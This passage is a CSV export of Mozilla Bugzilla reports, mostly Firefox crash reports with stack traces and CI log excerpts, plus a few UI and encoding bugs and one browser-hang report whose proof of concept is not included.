11282,This bug was filed from the Socorro interface and is  report bp-f51cc1bf-ee28-44ea-b748-6b0962170215. =============================================================  New crash which started with Build 20170215110205: http://bit.ly/2lSy3KA. Need help bucketing this in the right place so this the ni on snorp.  Possible regression range: https://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=195049fabb7ac5709e5f75614ba630ba3d1b5a9b&tochange=0a7831d838f793a263456df62f95a615472a7f95  Two Huawei devices seem to be more affected - the Honor 8 and the Nexus 6P.,Crash in java.lang.NullPointerException: at org.mozilla.gecko.media.CodecProxy.processInput(CodecProxy.java)
11311,"User Agent: Mozilla/5.0 (Windows NT 6.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1 Build ID: 20111220165912  Steps to reproduce:  I have forwarded some mails from Gmail users.   Actual results:  When I forward a message, the attachment filenames with accented characters (like á, é, í, ó and ú) have been replaced by only a question mark (?).   Expected results:  Attachment filenames with accented characters should have been maintained as they are.",Problem when forwarding attachment filenames with accented characters
11316,"User Agent: Mozilla/5.0 (Windows NT 6.2; rv:17.0) Gecko/20100101 Firefox/17.0 Build ID: 20121128204232  Steps to reproduce:  Steps to reproduce: tools -> options -> Languages: choose... -> Select a language to add  Actual results: italian globalization string is wrong: the right way to express the globalization is ""it-IT"" and NOT ""it"".","Firefox 17.0.1: wrong globalization string ""it"" => ""it-IT"""
11318,"Created attachment 684633 callstack  This crash is a rare one which happened till now only 1 time out of 1500 tests.  Will look to get a testcase for it.  media/webrtc/signaling/src/peerconnection/PeerConnectionMedia.h:264   mozilla::RefPtr<mozilla::NrIceMediaStream> ice_media_stream(size_t i) const {     // TODO(ekr@rtfm.com): If someone asks for a value that doesn't exist,     // make one.     if (i >= mIceStreams.size()) {  media/webrtc/signaling/src/media/VcmSIPCCBinding.cpp:559   mozilla::RefPtr<NrIceMediaStream> stream = pc->impl()->media()->     ice_media_stream(level-1);  media/webrtc/signaling/src/sipcc/core/gsm/lsm.c:648           vcmRxAllocICE(media->cap_index, dcb->group_id, media->refid,             lsm_get_ms_ui_call_handle(lcb->line, lcb->call_id, lcb->ui_id),             dcb->peerconnection,             media->level,             &default_addr, &port_allocated,             &candidates, &candidate_ct);  Tested with m-c changeset: 113925:20ec9014f220",WebRTC crash [@sipcc::PeerConnectionMedia::ice_media_stream]
11398,"**Filed by:** cbrindusan [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=247780637&repo=autoland **Full log:** https://queue.taskcluster.net/v1/task/CDtmD1LKQMmE8QMsyVU2nA/runs/0/artifacts/public/logs/live_backing.log  ---  [task 2019-05-22T14:47:55.541Z] 14:47:55     INFO -  25 INFO TEST-START | dom/html/test/test_bug1260704.html [task 2019-05-22T14:47:55.542Z] 14:47:55     INFO -  wait for org.mozilla.geckoview.test complete; top activity=com.android.launcher3 [task 2019-05-22T14:47:55.645Z] 14:47:55     INFO -  remoteautomation.py | Application ran for: 0:00:13.567038 [task 2019-05-22T14:47:56.059Z] 14:47:56     INFO -  mozcrash Copy/paste: /builds/worker/workspace/build/linux64-minidump_stackwalk /tmp/tmpQbTx8Q/67c5fbb6-9fc4-892c-0e2a-7b668ac2a301.dmp /builds/worker/workspace/build/symbols [task 2019-05-22T14:48:01.896Z] 14:48:01     INFO -  mozcrash Saved minidump as /builds/worker/workspace/build/blobber_upload_dir/67c5fbb6-9fc4-892c-0e2a-7b668ac2a301.dmp [task 2019-05-22T14:48:01.896Z] 14:48:01     INFO -  mozcrash Saved app info as /builds/worker/workspace/build/blobber_upload_dir/67c5fbb6-9fc4-892c-0e2a-7b668ac2a301.extra [task 2019-05-22T14:48:01.901Z] 14:48:01  WARNING -  PROCESS-CRASH | dom/html/test/test_bug1260704.html | application crashed [@ mozilla::net::CacheFile::NotifyListenersAboutOutputRemoval()] [task 2019-05-22T14:48:01.901Z] 14:48:01     INFO -  Crash dump filename: /tmp/tmpQbTx8Q/67c5fbb6-9fc4-892c-0e2a-7b668ac2a301.dmp [task 2019-05-22T14:48:01.901Z] 14:48:01     INFO -  Operating system: Android [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -                    0.0.0 Linux 3.10.0+ #1 PREEMPT Thu Jan 5 00:46:30 UTC 2017 x86_64 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -  CPU: amd64 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -       family 6 model 2 stepping 3 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -       1 CPU [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -  GPU: UNKNOWN [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -  Crash reason:  SIGSEGV /SEGV_MAPERR [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -  Crash address: 0x0 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -  Process uptime: not available [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -  Thread 11 (crashed) [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -   0  libxul.so!mozilla::net::CacheFile::NotifyListenersAboutOutputRemoval() [CacheFile.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 2321 + 0x0] [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      rax = 0x0000771995236c4c   rdx = 0x0000000000000004 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      rcx = 0x0000771998768a88   rbx = 0x00007719991dcbe8 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      rsi = 0x00007719991dc530   rdi = 0x000000000000001b [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      rbp = 0x00007719991dcc50   rsp = 0x00007719991dcbe0 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -       r8 = 0x0000000000000000    r9 = 0x00007719b4f0d090 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      r10 = 0x0000000000000022   r11 = 0x0000000000000246 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      r12 = 0x0000771988bcd4b0   r13 = 0x00007719898dc160 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      r14 = 0x00007719991dcbf8   r15 = 0x00007719898dc080 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      rip = 0x0000771990821515 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      Found by: given as instruction pointer in context [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -   1  libxul.so!mozilla::net::CacheFile::RemoveOutput(mozilla::net::CacheFileOutputStream*, nsresult) [CacheFile.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 2167 + 0x8] [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      rbx = 0x0000771987521b30   rbp = 0x00007719991dcc90 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      rsp = 0x00007719991dcc60   r12 = 0x00007719991dcd10 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      r13 = 0x00007719898dc080   r14 = 0x0000000080470002 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      r15 = 0x0000771987521b30   rip = 0x00007719908210f1 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -   2  libxul.so!mozilla::net::CacheFileOutputStream::CloseWithStatusLocked(nsresult) [CacheFileOutputStream.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 218 + 0x17] [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      rbx = 0x0000771987521b30   rbp = 0x00007719991dccb0 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      rsp = 0x00007719991dcca0   r12 = 0x00007719991dcd10 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      r13 = 0x00007719991dcd18   r14 = 0x0000000000000000 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      r15 = 0x00007719991dcd60   rip = 0x000077199083b5ca [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -   3  libxul.so!mozilla::net::CacheFileOutputStream::CloseWithStatus(nsresult) [CacheFileOutputStream.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 193 + 0xb] [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      rbx = 0x0000771987521b30   rbp = 0x00007719991dccf0 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      rsp = 0x00007719991dccc0   r12 = 0x00007719991dcd10 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      r13 = 0x00007719991dcd18   r14 = 0x0000000000000000 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      r15 = 0x00007719991dcd60   rip = 0x000077199083ba95 [task 2019-05-22T14:48:01.904Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.905Z] 14:48:01     INFO -   4  libxul.so!mozilla::net::AltDataOutputStreamParent::RecvClose(nsresult const&) [AltDataOutputStreamParent.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 62 + 0x11] [task 2019-05-22T14:48:01.905Z] 14:48:01     INFO -      rbx = 0x00007719881126f0   rbp = 0x00007719991dcd50 [task 2019-05-22T14:48:01.905Z] 14:48:01     INFO -      rsp = 0x00007719991dcd00   r12 = 0x00007719991dcd10 [task 2019-05-22T14:48:01.905Z] 14:48:01     INFO -      r13 = 0x00007719991dcd18   r14 = 0x0000771988112730 [task 2019-05-22T14:48:01.905Z] 14:48:01     INFO -      r15 = 0x00007719991dcd60   rip = 0x000077199088bbce [task 2019-05-22T14:48:01.905Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -   5  libxul.so!mozilla::net::PAltDataOutputStreamParent::OnMessageReceived(IPC::Message const&) [PAltDataOutputStreamParent.cpp: : 171 + 0x8] [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rbx = 0x00007719991dcd70   rbp = 0x00007719991dcdd0 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rsp = 0x00007719991dcd60   r12 = 0x000077198812fc00 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r13 = 0x0000000000000000   r14 = 0x00007719881126f0 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r15 = 0x000077198812fbf8   rip = 0x0000771990b84654 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -   6  libxul.so!mozilla::dom::PContentParent::OnMessageReceived(IPC::Message const&) [PContentParent.cpp: : 5488 + 0x15] [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rbx = 0x00007719991dcf60   rbp = 0x00007719991ddc40 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rsp = 0x00007719991dcde0   r12 = 0x0000000000000001 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r13 = 0x0000000000000000   r14 = 0x0000771986da4800 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r15 = 0x000077198812fbf8   rip = 0x0000771990ad3046 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -   7  libxul.so!mozilla::ipc::MessageChannel::DispatchAsyncMessage(mozilla::ipc::ActorLifecycleProxy*, IPC::Message const&) [MessageChannel.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 2158 + 0xd] [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rbx = 0x0000771986c9e0f8   rbp = 0x00007719991ddc80 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rsp = 0x00007719991ddc50   r12 = 0x0000000000000001 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r13 = 0x0000000000000000   r14 = 0x000077198812fbf8 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r15 = 0x000077198638f2c0   rip = 0x0000771990a3bd63 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -   8  libxul.so!mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) [MessageChannel.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 2082 + 0x5] [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rbx = 0x000077198983ce80   rbp = 0x00007719991ddd20 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rsp = 0x00007719991ddc90   r12 = 0x00007719875d4340 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r13 = 0x0000771986c9e0f8   r14 = 0x000077198812fbf8 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r15 = 0x00000000ffffffff   rip = 0x0000771990a3b20e [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -   9  libxul.so!mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) [MessageChannel.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 1939 + 0xb] [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rbx = 0x0000771986c9e0f8   rbp = 0x00007719991ddd60 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rsp = 0x00007719991ddd30   r12 = 0x00007719991dddd8 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r13 = 0x0000771998339108   r14 = 0x000077198812fbf8 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r15 = 0x000077198812fbd0   rip = 0x0000771990a3b6d3 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -  10  libxul.so!mozilla::ipc::MessageChannel::MessageTask::Run() [MessageChannel.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 1970 + 0xc] [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rbx = 0x000077198812fba0   rbp = 0x00007719991ddd80 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rsp = 0x00007719991ddd70   r12 = 0x00007719991dddd8 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r13 = 0x0000771998339108   r14 = 0x00007719875d4340 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r15 = 0x00007719991dde78   rip = 0x0000771990a3b96b [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -  11  libxul.so!nsThread::ProcessNextEvent(bool, bool*) [nsThread.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 1175 + 0x11] [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rbx = 0x00007719991dddf0   rbp = 0x00007719991de2b0 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rsp = 0x00007719991ddd90   r12 = 0x00007719991dddd8 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r13 = 0x0000771998339108   r14 = 0x0000771998339050 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r15 = 0x00007719991dde78   rip = 0x00007719905a3abb [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -  12  libxul.so!NS_ProcessNextEvent(nsIThread*, bool) [nsThreadUtils.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 486 + 0x14] [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rbx = 0x0000771998339050   rbp = 0x00007719991de2e0 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rsp = 0x00007719991de2c0   r12 = 0x0000000000000001 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r13 = 0x00007719983057e0   r14 = 0x00007719991de2c7 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r15 = 0x0000771998339050   rip = 0x00007719905a5f1b [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -  13  libxul.so!mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) [MessagePump.cpp:012f377d8d8286d0122072e4ad2ea7552e356e92 : 88 + 0xa] [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rbx = 0x0000771998337080   rbp = 0x00007719991de330 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rsp = 0x00007719991de2f0   r12 = 0x0000000000000001 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r13 = 0x00007719983057e0   r14 = 0x00007719983057c0 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r15 = 0x0000771998339050   rip = 0x0000771990a3dee8 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -  14  libxul.so!MessageLoop::RunInternal() [message_loop.cc:012f377d8d8286d0122072e4ad2ea7552e356e92 : 315 + 0x17] [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rbx = 0x0000771998337080   rbp = 0x00007719991de370 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      rsp = 0x00007719991de340   r12 = 0x00007719991de448 [task 2019-05-22T14:48:01.909Z] 14:48:01     INFO -      r13 = 0x00007719991de448   r14 = 0x00007719991de380 [task 2019-05-22T14:48:01.910Z] 14:48:01     INFO -      r15 = 0x00007719991de600   rip = 0x00007719909fc542 [task 2019-05-22T14:48:01.910Z] 14:48:01     INFO -      Found by: call frame info [task 2019-05-22T14:48:01.910Z] 14:48:01     INFO -  15  libxul.so!MessageLoop::Run() [message_loop.cc:012f377d8d8286d0122072e4ad2ea7552e356e92 : 290 + 0x8] [task 2019-05-22T14:48:01.910Z] 14:48:01     INFO -      rbx = 0x0000771998337080   rbp = 0x00007719991de3b0 [task 2019-05-22T14:48:01.910Z] 14:48:01     INFO -      rsp = 0x00007719991de380   r12 = 0x00007719991de448 [task 2019-05-22T14:48:01.910Z] 14:48:01     INFO -      r13 = 0x00007719991de448   r14 = 0x00007719991de380 [task 2019-05-22T14:48:01.910Z] 14:48:01     INFO -      r15 = 0x00007719991de600   rip = 0x00007719909fc4ac [task 2019-05-22T14:48:01.910Z] 14:48:01     INFO -      Found by: call frame info",Intermittent dom/html/test/test_bug1260704.html | application crashed [@ mozilla::net::CacheFile::NotifyListenersAboutOutputRemoval()]
11400,"the stack is similar to other failures but not identical, hard to say if it's a dupe  http://tinderbox.mozilla.org/showlog.cgi?log=Firefox/1258205813.1258206771.21554.gz  Thread 0 (crashed)  0  libgtk-x11-2.0.so.0.1200.0 + 0x231c8b     eip = 0xb6e88c8b   esp = 0xbf8bc910   ebp = 0xbf8bc988   ebx = 0xb6fd80bc     esi = 0xafcb6d00   edi = 0xafa72390   eax = 0xb5f57820   ecx = 0xafcb6d00     edx = 0x00650073   efl = 0x00010202     Found by: given as instruction pointer in context  1  libgtk-x11-2.0.so.0.1200.0 + 0x231f90     eip = 0xb6e88f91   esp = 0xbf8bc990   ebp = 0xbf8bc9a8     Found by: previous frame's frame pointer  2  libgdk-x11-2.0.so.0.1200.0 + 0x175e7     eip = 0xb6bcc5e8   esp = 0xbf8bc9b0   ebp = 0xbf8bc9c8     Found by: previous frame's frame pointer  3  libglib-2.0.so.0.1400.1 + 0x2f8d5     eip = 0xb6a128d6   esp = 0xbf8bc9d0   ebp = 0xbf8bc9f8     Found by: previous frame's frame pointer  4  libglib-2.0.so.0.1400.1 + 0x2f11b     eip = 0xb6a1211c   esp = 0xbf8bca00   ebp = 0xbf8bca58     Found by: previous frame's frame pointer  5  libglib-2.0.so.0.1400.1 + 0x3255e     eip = 0xb6a1555f   esp = 0xbf8bca60   ebp = 0xbf8bcab8     Found by: previous frame's frame pointer  6  libglib-2.0.so.0.1400.1 + 0x32ac4     eip = 0xb6a15ac5   esp = 0xbf8bcac0   ebp = 0xbf8bcad8     Found by: previous frame's frame pointer  7  libxul.so!nsAppShell::ProcessNextNativeEvent(int) [nsAppShell.cpp:01adc20ea792 : 147 + 0x9]     eip = 0xb7b09ee0   esp = 0xbf8bcae0   ebp = 0xbf8bcaf8     Found by: previous frame's frame pointer  8  libxul.so!nsBaseAppShell::DoProcessNextNativeEvent(int) [nsBaseAppShell.cpp:01adc20ea792 : 151 + 0xa]     eip = 0xb7b1e668   esp = 0xbf8bcb00   ebp = 0xbf8bcb18     Found by: previous frame's frame pointer  9  libxul.so!nsBaseAppShell::OnProcessNextEvent(nsIThreadInternal*, int, unsigned int) [nsBaseAppShell.cpp:01adc20ea792 : 284 + 0x9]     eip = 0xb7b1e89d   esp = 0xbf8bcb20   ebp = 0xbf8bcb48     Found by: previous frame's frame pointer 10  libxul.so!nsThread::ProcessNextEvent(int, int*) [nsThread.cpp:01adc20ea792 : 508 + 0x1c]     eip = 0xb7be6b2a   esp = 0xbf8bcb50   ebp = 0xbf8bcb88     Found by: previous frame's frame pointer 11  libxul.so!NS_ProcessPendingEvents_P(nsIThread*, unsigned int) [nsThreadUtils.cpp : 200 + 0x11]     eip = 0xb7bb742a   esp = 0xbf8bcb90   ebp = 0xbf8bcbc8     Found by: previous frame's frame pointer 12  libxul.so!mozilla::ShutdownXPCOM(nsIServiceManager*) [nsXPComInit.cpp:01adc20ea792 : 692 + 0xb]     eip = 0xb7bba4a0   esp = 0xbf8bcbd0   ebp = 0xbf8bcc18     Found by: previous frame's frame pointer 13  libxul.so!ScopedXPCOMStartup::~ScopedXPCOMStartup() [nsAppRunner.cpp:01adc20ea792 : 1017 + 0x7]     eip = 0xb7320f9e   esp = 0xbf8bcc20   ebp = 0xbf8bcc48     Found by: previous frame's frame pointer 14  libxul.so!XRE_main [nsAppRunner.cpp:01adc20ea792 : 3534 + 0xb]     eip = 0xb73233e6   esp = 0xbf8bcc50   ebp = 0xbf8bd1d8     Found by: previous frame's frame pointer 15  firefox-bin!main [nsBrowserApp.cpp:01adc20ea792 : 158 + 0xc]     eip = 0x080495c7   esp = 0xbf8bd1e0   ebp = 0xbf8bd238     Found by: previous frame's frame pointer 16  libc-2.6.1.so + 0x1604f     eip = 0xb669a050   esp = 0xbf8bd240   ebp = 0xbf8bd2a8     Found by: previous frame's frame pointer 17  ld-2.6.1.so + 0xcdf     eip = 0xb7fa0ce0   esp = 0xbf8bd244   ebp = 0xbf8bd2a8     Found by: stack scanning 18  libc-2.6.1.so + 0x1604f     eip = 0xb669a050   esp = 0xbf8bd250   ebp = 0xbf8bd2a8     Found by: stack scanning 19  ld-2.6.1.so + 0x181f     eip = 0xb7fa1820   esp = 0xbf8bd260   ebp = 0xbf8bd2a8     Found by: stack scanning 20  libc-2.6.1.so + 0xff3     eip = 0xb67c9ff4   esp = 0xbf8bd274   ebp = 0xbf8bd2a8     Found by: stack scanning 21  ld-2.6.1.so + 0xcdf     eip = 0xb7fa0ce0   esp = 0xbf8bd278   ebp = 0xbf8bd2a8     Found by: stack scanning 22  ld-2.6.1.so + 0x1265f     eip = 0xb7f98660   esp = 0xbf8bd298   ebp = 0xbf8bd2a8     Found by: stack scanning 23  libc-2.6.1.so + 0x15f7c     eip = 0xb6699f7d   esp = 0xbf8bd29c   ebp = 0xbf8bd2a8     Found by: stack scanning 24  ld-2.6.1.so + 0xff3     eip = 0xb7fa0ff4   esp = 0xbf8bd2a0   ebp = 0xbf8bd2a8     Found by: stack scanning",Talos shutdown crash during Ts_cold test [@ nsAppShell::ProcessNextNativeEvent(int)] involving libgtk
11420,"Created attachment 8950967 bomb_FF.html  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36  Steps to reproduce:  Tested on Firefox 58.0.2 (64-bit) on Windows 7 64bit  Load the attached PoC.   Actual results:  Firefox hangs with CPU at 100% and eventually memory runs out.   Expected results:  Firefox should prevent this behaviour and also allow the user to exit the tab or browser. This technique is already used in the wild (but originally targeted Chrome users): https://blog.malwarebytes.com/malwarebytes-news/2018/02/tech-support-scammers-find-new-way-jam-google-chrome/",Browser hangs on infinite downloads of blobs
11453,"From Bugzilla Helper: User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0) BuildID:    2000103120  Browser crashes with an access violation when trying to load  www.tomshardware.com   Reproducible: Sometimes Steps to Reproduce: 1. try to access www.tomshardware.com 2. if it doesnt crash, try resizing the browser window and load the page again.   Actual Results:  Crash with an access violation...          Expected Results:  load the page successfully.",Crash in layout when loading www.tomshardware.com
11466,"STR:  1. Visit https://bugzilla.mozilla.org/attachment.cgi?id=395281&action=edit 2. Click to zoom the screenshot that's in the attachment details frame  Expected: scrollbars at the edge of the iframe Actual: scrollbars are inset, scrolling the zoomed image leaves artifacts (see screenshot)  Think this might be OSX only",strange behaviour when user clicks to zoom an image in an iframe on a page that is being full paged zoomed
11570,Filed by: rvandermeulen [at] mozilla.com  https://treeherder.mozilla.org/logviewer.html#?job_id=130887928&repo=try  https://queue.taskcluster.net/v1/task/Un3hJkDBTf2bFTBp19J2Nw/runs/0/artifacts/public/logs/live_backing.log,Intermittent marionette.py | application crashed [@ dalvik-LinearAlloc (deleted) + 0x724a8]
11581,"I've started seeing this crash on shutdown in the last week or so.  (gdb) bt #0  0x00007fd5bd93930d in nanosleep () at ../sysdeps/unix/syscall-template.S:84 #1  0x00007fd5bd93925a in __sleep (seconds=0) at ../sysdeps/posix/sleep.c:55 #2  0x00007fd5b0c914a2 in ah_crap_handler(int) (signum=6) at /home/morbo/hg/firefox/toolkit/xre/nsSigHandlers.cpp:103 #3  0x00007fd5b0c773ec in nsProfileLock::FatalSignalHandler(int, siginfo_t*, void*) (signo=6, info=0x7ffc67ba4b70, context=0x7ffc67ba4a40) at /home/morbo/hg/firefox/toolkit/profile/nsProfileLock.cpp:187 #4  0x00007fd5be6ed390 in <signal handler called> () at /lib/x86_64-linux-gnu/libpthread.so.0 #5  0x00007fd5bd8a2428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54 #6  0x00007fd5bd8a402a in __GI_abort () at abort.c:89 #7  0x00007fd5bd89abd7 in __assert_fail_base (fmt=<optimized out>, assertion=assertion@entry=0x7fd5ba5881dc ""fcCacheChains[i] == NULL"", file=file@entry=0x7fd5ba5881d2 ""fccache.c"", line=line@entry=534, function=function@entry=0x7fd5ba588390 <__PRETTY_FUNCTION__.9090> ""FcCacheFini"") at assert.c:92 #8  0x00007fd5bd89ac82 in __GI___assert_fail (assertion=assertion@entry=0x7fd5ba5881dc ""fcCacheChains[i] == NULL"", file=file@entry=0x7fd5ba5881d2 ""fccache.c"", line=line@entry=534, function=function@entry=0x7fd5ba588390 <__PRETTY_FUNCTION__.9090> ""FcCacheFini"") at assert.c:101 #9  0x00007fd5ba56b0f9 in FcCacheFini () at fccache.c:534 #10 0x00007fd5ba57897e in IA__FcFini () at fcinit.c:193 #11 0x00007fd5b0c7f977 in MOZ_gdk_display_close(GdkDisplay*) (display=0x7fd5bd6e7240)     at /home/morbo/hg/firefox/toolkit/xre/nsAppRunner.cpp:2953 #12 0x00007fd5b0c8cb23 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) (this=this@entry=0x7ffc67ba52d0, argc=argc@entry=4, argv=argv@entry=0x7ffc67ba6628, aConfig=...)     at /home/morbo/hg/firefox/toolkit/xre/nsAppRunner.cpp:4831 #13 0x00007fd5b0c8cdbe in XRE_main(int, char**, mozilla::BootstrapConfig const&) (argc=4, argv=0x7ffc67ba6628, aConfig=...) at /home/morbo/hg/firefox/toolkit/xre/nsAppRunner.cpp:4855 #14 0x00007fd5b0c9cfd9 in mozilla::BootstrapImpl::XRE_main(int, char**, mozilla::BootstrapConfig const&) (this=<optimized out>, argc=<optimized out>, argv=<optimized out>, aConfig=...) at /home/morbo/hg/firefox/toolkit/xre/Bootstrap.cpp:45 #15 0x0000000000405ebd in do_main(int, char**, char**) (argc=argc@entry=4, argv=argv@entry=0x7ffc67ba6628, envp=envp@entry=0x7ffc67ba6650) at /home/morbo/hg/firefox/browser/app/nsBrowserApp.cpp:236 #16 0x0000000000405fc1 in main(int, char**, char**) (argc=4, argv=0x7ffc67ba6628, envp=0x7ffc67ba6650)     at /home/morbo/hg/firefox/browser/app/nsBrowserApp.cpp:309",component manager and world leak followed by fccache.c:534: FcCacheFini: Assertion `fcCacheChains[i] == NULL' failed
11608,Filed by: rgurzau [at] mozilla.com  https://treeherder.mozilla.org/logviewer.html#?job_id=172505235&repo=autoland  https://queue.taskcluster.net/v1/task/FVoyXmheTb-b_QbEMlvcBw/runs/0/artifacts/public/logs/live_backing.log  [task 2018-04-07T23:41:40.907Z] 23:41:40     INFO -  TEST-START | testing/marionette/harness/marionette_harness/tests/unit/test_screenshot.py TestScreenCaptureContent.test_capture_viewport [task 2018-04-07T23:41:50.085Z] 23:41:50     INFO -  mozcrash Copy/paste: /usr/local/bin/linux64-minidump_stackwalk /tmp/tmpruQ9dw/07f9f7da-9c89-9267-dccf-b37725996722.dmp /builds/worker/workspace/build/symbols [task 2018-04-07T23:42:00.755Z] 23:42:00     INFO -  mozcrash Saved minidump as /builds/worker/workspace/build/blobber_upload_dir/07f9f7da-9c89-9267-dccf-b37725996722.dmp [task 2018-04-07T23:42:00.756Z] 23:42:00     INFO -  mozcrash Saved app info as /builds/worker/workspace/build/blobber_upload_dir/07f9f7da-9c89-9267-dccf-b37725996722.extra [task 2018-04-07T23:42:00.759Z] 23:42:00  WARNING -  PROCESS-CRASH | testing/marionette/harness/marionette_harness/tests/unit/test_screenshot.py 